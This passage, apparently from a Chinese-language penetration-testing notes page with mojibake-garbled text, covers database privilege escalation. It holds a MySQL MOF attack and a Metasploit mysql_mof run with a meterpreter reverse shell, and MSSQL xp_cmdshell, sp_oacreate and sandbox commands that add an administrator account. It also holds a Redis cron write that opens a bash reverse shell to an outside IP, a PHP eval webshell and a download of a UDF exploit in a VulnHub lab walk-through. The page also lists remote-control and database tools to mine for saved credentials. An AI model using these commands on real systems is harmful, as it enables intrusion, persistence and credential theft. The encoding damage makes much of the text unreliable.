class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">select load_file(<span class="hljs-string">&quot;C:/nullevt.mof&quot;</span>) into dumpfile <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br>è¿™é‡Œä¸èƒ½ä½¿ç”¨outfileï¼Œå› ä¸ºä¼šåœ¨æœ«ç«¯å†™å…¥æ–°è¡Œï¼Œå› æ­¤mofåœ¨è¢«å½“ä½œäºŒè¿›åˆ¶æ–‡ä»¶æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œ<br>æ‰€ä»¥æˆ‘ä»¬ç”¨dumpfileå¯¼å‡ºä¸€è¡Œæ•°æ®ã€‚<br><br>è¯¥æ–‡ä»¶æ•ˆæœåˆ›å»ºä¸€ä¸ªé«˜æƒé™ç”¨æˆ·ï¼ˆä»ä¸Šé¢è„šæœ¬å¯çŸ¥è´¦å·å¯†ç ä¸º  mofmofï¼‰<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">username</span> /delete  åˆ é™¤ç”¨æˆ·åˆ ä¸æ‰<br><br><br><br><br><br><br><span class="hljs-comment"># åœæ­¢ winmgmt æœåŠ¡</span><br>net <span class="hljs-literal">stop</span> winmgmt<br><span class="hljs-comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span><br>rmdir /s /q C:\Windows\system32\wbem\Repository\<br><span class="hljs-comment"># æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶</span><br>del C:\Windows\system32\wbem\mof\good\nullevt.mof /F /S<br><br><span class="hljs-comment"># åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">mofmof</span> /delete<br><span class="hljs-comment"># é‡æ–°å¯åŠ¨æœåŠ¡</span><br>net <span class="hljs-literal">start</span> winmgmt<br><br></code></pre></td></tr></table></figure><h4 id="6-4ã€MSFå®ç°"><a href="#6-4ã€MSFå®ç°" class="headerlink" title="6.4ã€MSFå®ç°"></a>6.4ã€MSFå®ç°</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/mysql/mysql_mof<br> <br># è®¾ç½®payload<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br> <br># è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯<br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.1.2</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">username root</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">password root</span><br>run<br></code></pre></td></tr></table></figure><h4 id="6-5ã€æ”¶å°¾å·¥ä½œ"><a href="#6-5ã€æ”¶å°¾å·¥ä½œ" class="headerlink" title="6.5ã€æ”¶å°¾å·¥ä½œ"></a>6.5ã€æ”¶å°¾å·¥ä½œ</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># åœæ­¢ winmgmt æœåŠ¡</span><br>net <span class="hljs-literal">stop</span> winmgmt<br> <br><span class="hljs-comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span><br>rmdir /s /q C:\Windows\system32\wbem\Repository\<br> <br><span class="hljs-comment"># æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br> <br><span class="hljs-comment"># åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">hacker</span> /delete<br> <br><span class="hljs-comment"># é‡æ–°å¯åŠ¨æœåŠ¡</span><br>net <span class="hljs-literal">start</span> winmgmt<br></code></pre></td></tr></table></figure><h2 id="äºŒã€MSSQL"><a href="#äºŒã€MSSQL" class="headerlink" title="äºŒã€MSSQL"></a>äºŒã€MSSQL</h2><h3 id="1ã€xp-cmdshellææƒ"><a href="#1ã€xp-cmdshellææƒ" class="headerlink" title="1ã€xp_cmdshellææƒ"></a>1ã€xp_cmdshellææƒ</h3><p>è´¦å·å¯†ç ï¼šsa&#x2F;admin</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">xp<span class="hljs-emphasis">_cmdshellé»˜è®¤åœ¨mssql2000ä¸­æ˜¯å¼€å¯çš„ï¼Œåœ¨mssql2005ä¹‹åçš„ç‰ˆæœ¬ä¸­åˆ™é»˜è®¤ç¦æ­¢ã€‚</span><br><span class="hljs-emphasis">å¦‚æœç”¨æˆ·æ‹¥æœ‰ç®¡ç†å‘˜saæƒé™åˆ™å¯ä»¥ç”¨sp_</span>configureé‡ä¿®å¼€å¯å®ƒã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230427094638419.png" alt="image-20230427094638419"></p><p><img src="/image/image-20230427094717800.png" alt="image-20230427094717800"></p><h4 id="1-1ã€æ‰§è¡Œ"><a href="#1-1ã€æ‰§è¡Œ" class="headerlink" title="1.1ã€æ‰§è¡Œ"></a>1.1ã€æ‰§è¡Œ</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ‰§è¡Œï¼š<br>EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;å‘½ä»¤&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230426173523745.png" alt="image-20230426173523745"></p><h4 id="1-2ã€å¦‚æœè¢«å…³é—­äº†"><a href="#1-2ã€å¦‚æœè¢«å…³é—­äº†" class="headerlink" title="1.2ã€å¦‚æœè¢«å…³é—­äº†"></a>1.2ã€å¦‚æœè¢«å…³é—­äº†</h4><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs hsp">å¯ç”¨ï¼š<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><br>ç›¸åº”çš„å…³é—­å‘½ä»¤ä¸º â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“<br>å…³é—­ï¼š<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>reconfigure<span class="hljs-comment">;</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>reconfigure<span class="hljs-comment">;</span><br><br>ä¸‹å›¾ä¸ºå¼€å…³è¢«å…³â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230426173451948.png" alt="image-20230426173451948"></p><h4 id="1-3ã€å¦‚æœè¢«åˆ é™¤äº†"><a href="#1-3ã€å¦‚æœè¢«åˆ é™¤äº†" class="headerlink" title="1.3ã€å¦‚æœè¢«åˆ é™¤äº†"></a>1.3ã€å¦‚æœè¢«åˆ é™¤äº†</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ;'"><br>1ã€åˆ¤æ–­xp_cmdshellæ˜¯å¦å­˜åœ¨<br> SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;; <br>-- ç»“æœä¸º1 è¡¨ç¤ºå­˜åœ¨<br><br>2ã€åˆ é™¤æ‰©å±•å­˜å‚¨è¿‡è¿‡ç¨‹xp_cmdshellçš„è¯­å¥ <br> exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;<br> <br>3ã€æ¢å¤cmdshellçš„sqlè¯­å¥ <br> exec sp_addextendedproc xp_cmdshell ,@dllname =â€™xplog70.dllâ€™ <br><br>4ã€å¦åˆ™éœ€ä¸Šä¼ c:\inetput\web\xplog70.dllå <br> exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;<br></code></pre></td></tr></table></figure><h4 id="â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“"><a href="#â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“" class="headerlink" title="â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“"></a>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“</h4><h3 id="2ã€sp-oacreateææƒ"><a href="#2ã€sp-oacreateææƒ" class="headerlink" title="2ã€sp_oacreateææƒ"></a>2ã€sp_oacreateææƒ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">ä¸»è¦æ˜¯ç”¨æ¥è°ƒç”¨OLEå¯¹è±¡ï¼Œåˆ©ç”¨OLEå¯¹è±¡çš„runæ–¹æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>å¯ç”¨ï¼š<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;  <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><br><br>å…³é—­ï¼š<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">0</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;  <br><br>æ‰§è¡Œï¼š<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="3ã€SQL-Server-æ²™ç›’ææƒ"><a href="#3ã€SQL-Server-æ²™ç›’ææƒ" class="headerlink" title="3ã€SQL Server æ²™ç›’ææƒ"></a>3ã€SQL Server æ²™ç›’ææƒ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><br><br><span class="hljs-comment">--å…³é—­æ²™ç›’æ¨¡å¼ï¼Œå¦‚æœä¸€æ¬¡æ‰§è¡Œå…¨éƒ¨ä»£ç æœ‰é—®é¢˜ï¼Œå…ˆæ‰§è¡Œä¸Šé¢ä¸¤å¥ä»£ç ã€‚</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br><br><br><span class="hljs-comment">--æŸ¥è¯¢æ˜¯å¦æ­£å¸¸å…³é—­ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ²™ç›’æ¨¡å¼æ— è®ºæ˜¯å¼€ï¼Œè¿˜æ˜¯å…³ï¼Œéƒ½ä¸ä¼šå½±å“æˆ‘ä»¬æ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚</span><br><span class="hljs-keyword">exec</span> master.dbo.xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>;<br><br><br><span class="hljs-comment">--æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net user qianxun 123456 /add&quot;)&#x27;</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net localgroup administrators qianxun /add&quot;)&#x27;</span>)<br><br><span class="hljs-comment">-- æ¢å¤é…ç½®</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCALMACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">æ²™ç›’æ¨¡å¼SandBoxModeå‚æ•°å«ä¹‰ï¼ˆé»˜è®¤æ˜¯<span class="hljs-number">2</span>ï¼‰<br><br><span class="hljs-number">0</span>ï¼šåœ¨ä»»ä½•æ‰€æœ‰è€…ä¸­ç¦æ­¢å¯ç”¨å®‰å…¨æ¨¡å¼<br><br><span class="hljs-number">1</span> ï¼šä¸ºä»…åœ¨å…è®¸èŒƒå›´å†…<br><br><span class="hljs-number">2</span> ï¼šå¿…é¡»åœ¨<span class="hljs-keyword">access</span>æ¨¡å¼ä¸‹<br><br><span class="hljs-number">3</span>ï¼šå®Œå…¨å¼€å¯<br><br>openrowsetæ˜¯å¯ä»¥é€šè¿‡OLE DBè®¿é—®<span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>æ•°æ®åº“ï¼ŒOLE DBæ˜¯åº”ç”¨ç¨‹åºé“¾æ¥åˆ°<span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>çš„çš„é©±åŠ¨ç¨‹åºã€‚<br><br></code></pre></td></tr></table></figure><h3 id="navicatè¿æ¥mssqlæ³¨æ„"><a href="#navicatè¿æ¥mssqlæ³¨æ„" class="headerlink" title="navicatè¿æ¥mssqlæ³¨æ„"></a>navicatè¿æ¥mssqlæ³¨æ„</h3><p>æŠ¥é”™ç¼ºå°‘ODBC,è¯·åœ¨navicatç›®å½•ä¸‹å®‰è£…ä¸‹é¢è¿™ä¸ª</p><p><img src="/image/image-20230426173035567.png" alt="image-20230426173035567"></p><h2 id="ä¸‰ã€Redis"><a href="#ä¸‰ã€Redis" class="headerlink" title="ä¸‰ã€Redis"></a>ä¸‰ã€Redis</h2><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stata">è¿æ¥(æœªæˆæƒæˆ–æœ‰å¯†ç )-åˆ©ç”¨å¦‚ä¸‹æ–¹æ³•ææƒ<br>é‡‡ç”¨æœªæˆæƒç›´æ¥åˆ©ç”¨ï¼Œå¯†ç è¿›å…¥éœ€è·å–é…ç½®æ–‡ä»¶è¯»å–<br>1ã€è®¾ç½®é”®å€¼ä¸ºåå¼¹å‘½ä»¤çš„è®¡åˆ’ä»»åŠ¡å†™æ³•<br>2ã€è®¾ç½®å†™å…¥ç›®å½•ä¸º/<span class="hljs-keyword">var</span>/spool/cron/<br>3ã€è®¾ç½®å†™å…¥æ–‡ä»¶åä¸ºyeyeye<br>4ã€ä¿å­˜æ‰§è¡Œ<br><span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/47.114.103.63/7788 0&gt;&amp;1\n&quot;</span><br>config <span class="hljs-keyword">set</span> <span class="hljs-keyword">dir</span> /<span class="hljs-keyword">var</span>/spool/cron/<br>config <span class="hljs-keyword">set</span> dbfilename yeyeye<br><span class="hljs-keyword">save</span><br><br>(1).åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹<span class="hljs-keyword">shell</span><br>(2).å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥ç™»é™†<br>(3).æƒé™è¾ƒä½å¾€webç‰©ç†è·¯å¾„å†™webshell<br>ä¿®å¤æ–¹æ¡ˆï¼š<br>æ³¨æ„ï¼šä»¥ä¸‹æ“ä½œï¼Œå‡éœ€é‡å¯ Redis åæ‰èƒ½ç”Ÿæ•ˆã€‚<br>ç»‘å®šéœ€è¦è®¿é—®æ•°æ®åº“çš„IPã€‚Â å°†127.0.0.1ä¿®æ”¹ä¸ºéœ€è¦è®¿é—®æ­¤æ•°æ®åº“çš„IPåœ°å€ã€‚<br>è®¾ç½®è®¿é—®å¯†ç ã€‚åœ¨Â Redis.<span class="hljs-keyword">conf</span>ä¸­requirepassÂ å­—æ®µåï¼Œè®¾ç½®æ·»åŠ è®¿é—®å¯†ç ã€‚<br>ä¿®æ”¹RedisæœåŠ¡è¿è¡Œè´¦å·ã€‚ä»¥è¾ƒä½æƒé™è´¦å·è¿è¡ŒRedisæœåŠ¡ï¼Œç¦ç”¨è´¦å·çš„ç™»å½•æƒé™ã€‚<br></code></pre></td></tr></table></figure><h2 id="å››ã€å…¶ä»–-æ‚é¡¹"><a href="#å››ã€å…¶ä»–-æ‚é¡¹" class="headerlink" title="å››ã€å…¶ä»–_æ‚é¡¹"></a>å››ã€å…¶ä»–_æ‚é¡¹</h2><h3 id="1ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘æ—¥è‘µ"><a href="#1ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘æ—¥è‘µ" class="headerlink" title="1ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘æ—¥è‘µ"></a>1ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘æ—¥è‘µ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /svg<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230427112800471.png" alt="image-20230427112800471"></p><h3 id="2ã€ä¸Šä¼ å¹¶ä¸”è¿è¡Œ"><a href="#2ã€ä¸Šä¼ å¹¶ä¸”è¿è¡Œ" class="headerlink" title="2ã€ä¸Šä¼ å¹¶ä¸”è¿è¡Œ"></a>2ã€ä¸Šä¼ å¹¶ä¸”è¿è¡Œ</h3><p><img src="/image/image-20230427112546620.png" alt="image-20230427112546620"></p><p>3ã€è¿›è¡Œè§£å¯†</p><p><img src="/image/image-20230427144425969.png" alt="image-20230427144425969"></p><h3 id="3ã€è¿è¡Œè§£å¯†è„šæœ¬"><a href="#3ã€è¿è¡Œè§£å¯†è„šæœ¬" class="headerlink" title="3ã€è¿è¡Œè§£å¯†è„šæœ¬"></a>3ã€è¿è¡Œè§£å¯†è„šæœ¬</h3><p><img src="/image/image-20230427145300383.png" alt="image-20230427145300383"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><br><span class="hljs-comment">#ä¸‰æ–¹åº”ç”¨-Teamviewer&amp;å‘æ—¥è‘µ&amp;Navivat-å‡­æ®</span><br><span class="hljs-string">è¿œæ§ç±»ï¼šTeamviewer</span> <span class="hljs-string">å‘æ—¥è‘µ</span> <span class="hljs-string">Todesk</span> <span class="hljs-string">VNC</span> <span class="hljs-string">Radmin</span> <span class="hljs-string">ç­‰</span><br><span class="hljs-string">å¯†ç ç±»ï¼šå„å¤§æµè§ˆå™¨</span> <span class="hljs-string">Xshell</span> <span class="hljs-string">Navicat</span> <span class="hljs-number">3389</span> <span class="hljs-string">ç­‰</span><br><span class="hljs-string">æœåŠ¡ç±»ï¼šFileZilla</span> <span class="hljs-string">Serv-u</span> <span class="hljs-string">Zendç­‰</span><br><span class="hljs-string">æ¼”ç¤ºï¼š</span><br><span class="hljs-number">1</span><span class="hljs-string">ã€ç”¨æˆ·ï¼šTeamviewer</span> <br><span class="hljs-number">2</span><span class="hljs-string">ã€Webç”¨æˆ·ï¼šå‘æ—¥è‘µ</span><br><span class="hljs-number">3</span><span class="hljs-string">ã€ç”¨æˆ·ï¼šNavicat</span><br><br></code></pre></td></tr></table></figure><h3 id="4ã€teamvierwer"><a href="#4ã€teamvierwer" class="headerlink" title="4ã€teamvierwer"></a>4ã€teamvierwer</h3><p><img src="/image/image-20230427150345953.png" alt="image-20230427150345953"></p><h3 id="5ã€navicat"><a href="#5ã€navicat" class="headerlink" title="5ã€navicat"></a>5ã€navicat</h3><p><img src="/image/image-20230427155654940.png" alt="image-20230427155654940"></p><h2 id="äº”ã€MYSQLæ•°æ®åº“ææƒ"><a href="#äº”ã€MYSQLæ•°æ®åº“ææƒ" class="headerlink" title="äº”ã€MYSQLæ•°æ®åº“ææƒ"></a>äº”ã€MYSQLæ•°æ®åº“ææƒ</h2><h4 id="1ã€è‡ªåŠ¨åŒ–å·¥å…·MDUT"><a href="#1ã€è‡ªåŠ¨åŒ–å·¥å…·MDUT" class="headerlink" title="1ã€è‡ªåŠ¨åŒ–å·¥å…·MDUT"></a>1ã€è‡ªåŠ¨åŒ–å·¥å…·MDUT</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">MDUTï¼š   https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SafeGroceryStore/</span>MDUT <br></code></pre></td></tr></table></figure><h4 id="2ã€LiqunKit"><a href="#2ã€LiqunKit" class="headerlink" title="2ã€LiqunKit"></a>2ã€LiqunKit</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ç»¼åˆé«˜å±æ¼æ´åˆ©ç”¨å·¥å…·(åŒ…å«å„å¤§æ•°æ®åº“)  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Liqunkit/</span>LiqunKit_  <br></code></pre></td></tr></table></figure><h4 id="3ã€é¶åœºæ¼”ç¤º"><a href="#3ã€é¶åœºæ¼”ç¤º" class="headerlink" title="3ã€é¶åœºæ¼”ç¤º"></a>3ã€é¶åœºæ¼”ç¤º</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://www.vulnhub.com/entry/raven<span class="hljs-number">-2</span>,<span class="hljs-number">269</span>/<br>ä¸€ã€æ¢é’ˆIPåŠç«¯å£<br>    nmap <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br><br>äºŒã€åˆ©ç”¨phpmaileræ¼æ´è¿›è¡Œä¿®æ”¹å¹¶åå¼¹<br>    python D:/Myproject/<span class="hljs-number">40974.</span>py<br>    nc -lvvp <span class="hljs-number">4444</span><br><br>ä¸‰ã€å†™å…¥åé—¨åˆ©ç”¨èœåˆ€è¿æ¥æ–¹ä¾¿æ“ä½œ<br>    echo <span class="hljs-string">&#x27;&lt;?php eval($_POST[x]);?&gt;&#x27;</span> &gt;<span class="hljs-number">1.</span>php<br>    ä¸Šä¼ ä¿¡æ¯æ”¶é›†è„šæœ¬è¿›è¡Œææƒä¿¡æ¯æ”¶é›†<br>    ./LinEnum.sh<br>    ç¿»é˜…æ•°æ®åº“é…ç½®æ–‡ä»¶è·å–rootå¯†ç <br>    <br><span class="hljs-number">1</span>ã€åˆ©ç”¨Mysqlææƒ searchsploit<br>ä¸‹è½½mysql udf kali pocè¿›è¡Œç¼–è¯‘<br>wget https://www.exploit-db.com/download/<span class="hljs-number">1518</span><br>mv <span class="hljs-number">1518</span> raptor_udf.c<br>gcc -g -c 